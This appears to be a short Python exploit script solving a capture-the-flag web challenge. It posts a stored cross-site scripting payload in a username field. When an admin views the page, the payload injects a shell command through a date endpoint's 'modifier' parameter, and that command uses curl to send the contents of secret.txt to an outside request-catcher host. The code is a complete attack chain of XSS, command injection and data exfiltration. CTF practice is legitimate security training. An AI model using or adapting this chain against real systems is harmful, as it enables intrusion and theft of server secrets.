
import requests

# Endpoint that will catch the request 
exfiltration_server = "myname.requestcatcher.com/test"

# Will add a script into the username field
# When the admin visits this page a request will be made using the vulnerable endpoint /stats/ 
url = "https://not-a-problem.chal.cyberjousting.com/api/stats"
data = {
    "username": f'<script>' \
                f'fetch("/api/date?modifier=%3B%20curl%20http://{exfiltration_server}/log%3Fdata%3D$(cat%20secret.txt)")' \
                f'</script>',
    "high_score": 100
}
response = requests.post(url, json=data)
print(response.text)
